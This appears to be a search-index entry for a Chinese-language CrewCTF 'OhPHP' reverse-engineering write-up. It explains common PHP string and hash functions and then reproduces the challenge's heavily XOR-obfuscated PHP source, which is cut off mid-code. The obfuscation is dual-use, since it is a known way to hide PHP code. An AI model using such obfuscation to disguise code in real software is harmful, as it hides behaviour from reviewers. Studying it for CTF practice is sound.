[{"id":0,"href":"/security/practice/crewctf/reverse/crewctf---ohphp/","title":"Crew Ctf Oh Php","section":"Securities","content":" CrewCTF - OhPHP # Background # PHP - substr() :::spoiler substr( $string , $start , $length ) $strting 是原始的字串，$start 是要開始擷取的位置，$length 則為要截取的字串長度，要注要的是 $start 與 $length 都必須為數字才有作用，可以是正整數，也可以是負整數，以下提供幾個範例參考。 :::\nPHP - strstr() :::spoiler 查找 \u0026ldquo;world\u0026rdquo; 在 \u0026ldquo;Hello world!\u0026rdquo; 中是否存在，如果是，返回該字符串及後面剩餘部分\n\u0026lt;?php echo strstr(\u0026#34;Hello world!\u0026#34;,\u0026#34;world\u0026#34;); // 輸出 world! ?\u0026gt; ::: PHP - strrev() :::spoiler 反轉字符串 \u0026ldquo;Hello World!\u0026quot;：\n\u0026lt;?php echo strrev(\u0026#34;Hello world!\u0026#34;); // 輸出!dlroW olleH ?\u0026gt; ::: PHP strnatcmp() :::spoiler 使用\u0026quot;自然\u0026quot;算法來比較兩個字符串（區分大小寫）：\n\u0026lt;?php echo strnatcmp(\u0026#34;2Hello world!\u0026#34;,\u0026#34;10Hello world!\u0026#34;); // 輸出-1 echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo strnatcmp(\u0026#34;10Hello world!\u0026#34;,\u0026#34;2Hello world!\u0026#34;); // 輸出+1 ?\u0026gt; strnatcmp() 函數使用一種\u0026quot;自然\u0026quot;算法來比較兩個字符串。 在自然算法中，數字 2 小於數字 10。在計算機排序中，10 小於 2，這是因為 10 中的第一個數字小於 2。 :::\nPHP - crc32() :::spoiler \u0026lt;?php $str = crc32(\u0026#34;Hello World!\u0026#34;); // Output: 472456355 printf(\u0026#34;%u\\n\u0026#34;,$str); ?\u0026gt; ::: PHP - srand() PHP - strpos() :::spoiler 查找 \u0026ldquo;php\u0026rdquo; 在字符串中第一次出現的位置：\n\u0026lt;?php echo strpos(\u0026#34;You love php, I love php too!\u0026#34;,\u0026#34;php\u0026#34;); // Output: 9 ?\u0026gt; ::: PHP - array_sum() :::spoiler array_sum 這個函式用來統計陣列 Array 中的數值總數，並回傳統計值，如果陣列內的數值為整數，array_sum 傳回統計值將為整數，若陣列內數值為浮點數，則 array_sum 可能會傳回整數或浮點數。\n\u0026lt;?php $a = array(2, 3, 4); $b = array(\u0026#34;a\u0026#34; =\u0026gt; 1.2, \u0026#34;b\u0026#34; =\u0026gt; 2.0, \u0026#34;c\u0026#34; =\u0026gt; 3.3); echo array_sum($a); // Output: 9 echo array_sum($b); // Output: 6.5 ?\u0026gt; ::: PHP - pack() :::spoiler pack() 函數把數據裝入一個二進制字符串。詳細的格式可以看原網頁\n\u0026lt;?php echo pack(\u0026#34;C3\u0026#34;,80,72,80); ?\u0026gt; ::: PHP - Arrays PHP使用SHA256、SHA512等演算法的寫法 :::spoiler \u0026lt;?php echo hash(\u0026#39;sha256\u0026#39;, \u0026#39;abc\u0026#39;); echo hash(\u0026#39;sha512\u0026#39;, \u0026#39;abc\u0026#39;); // md5, sha1.. 等等也都可以用此寫法 echo hash(\u0026#39;md5\u0026#39;, \u0026#39;abc\u0026#39;); echo hash(\u0026#39;sha1\u0026#39;, \u0026#39;abc\u0026#39;); ?\u0026gt; ::: PHP - base64_decode() :::spoiler \u0026lt;?php $str = \u0026#39;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==\u0026#39;; echo base64_decode($str); // Output: This is an encoded string ?\u0026gt; ::: Source Code # :::spoiler\n\u0026lt;?php (((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))()),[(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))])?(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;))(((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))(),(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))?((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39